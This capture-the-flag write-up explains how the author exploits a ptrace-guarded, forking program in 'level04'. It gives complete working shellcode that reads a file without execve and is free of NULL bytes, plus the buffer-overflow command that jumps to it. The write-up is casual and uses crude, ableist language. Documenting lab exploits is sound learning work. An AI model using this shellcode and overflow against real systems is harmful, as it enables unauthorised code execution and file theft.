# level04

There is no excuse here, we're getting autistic.

The [target program](source.c) is a little tricky as it uses anti-debugging techniques and forks in order to get us to exploit it.

The program forks, creating a child that awaits in a `gets` call, and a saying "Give me some shellcode, k" (pretty fitting). The parent is looping while `ptrace`-ing its child, peeking at whatever syscall is asked to be executed, and killing everything if the syscall `11` is raised. As you might've guessed, the syscall `11` is `execve`.

***SO.***

We have to write a payload that will let us read the flag, while not using the `execve` syscall. This is where most people would struggle, because since the beginning, every time we've had custom code execution, we could use a simple execve to bash and be done with it. Luckily, I have Tylenol.

In this case however, we're handed code execution on a silver platter, but have to figure out how to get the flag without a shell.

Oh and, just saying, since we're using `gets`, we're not allowed to have any `NULL` bytes in the input, otherwise the string would cut off.

96 lines of dumbfuck assembly later, we get a full payload that doesn't have a `NULL` byte and fits in less than 0x6b bytes. There's so much cool stuff i've had to do to make this work and I want to explain it all in a 30 page essay but in a nutshell:
- There's the target file path in a variable `filename`
- There's a 1 byte buffer right after it. This allows us to call `read(2)` in a loop to get the file's contents since some operations accessing the stack have a memory address, thus a null byte
- This buffer ALSO acts as a null byte at runtime so we can terminate the target path string when calling `open(2)`
- Lots of relative calls because of course

After having written the assembly payload, we still need to jump into our code, so we need to overflow the buffer, and jump into our payload, which we put in an environemnt variable:

...anyways, here's the result:
```
$ export OUIOUI=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x4a\x5b\x89\xdd\x83\xc5\x19\x31\xc0\x4d\x88\x45\x01\x45\x31\xc0\x40\x40\x40\x40\x40\x31\xc9\x31\xd2\xcd\x80\x89\xc7\x31\xc0\x40\x40\x40\x31\xdb\x89\xe9\x31\xd2\x42\xcd\x80\x31\xc0\x40\x40\x40\x89\xfb\x89\xe9\x31\xd2\x42\xcd\x80\x31\xc0\x40\x40\x40\x40\x31\xdb\x43\x89\xe9\x31\xd2\x42\xcd\x80\xeb\xd2\xe8\xb1\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73\xff'
$ (echo -n $'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x5a\xde\xff\xff'; cat) | ./level04
...
3
8
Q
L
c
N
5
... (yes you need to press enter after each letter, and yes you're going to be in pain copying it)
```

truely a :3 moment
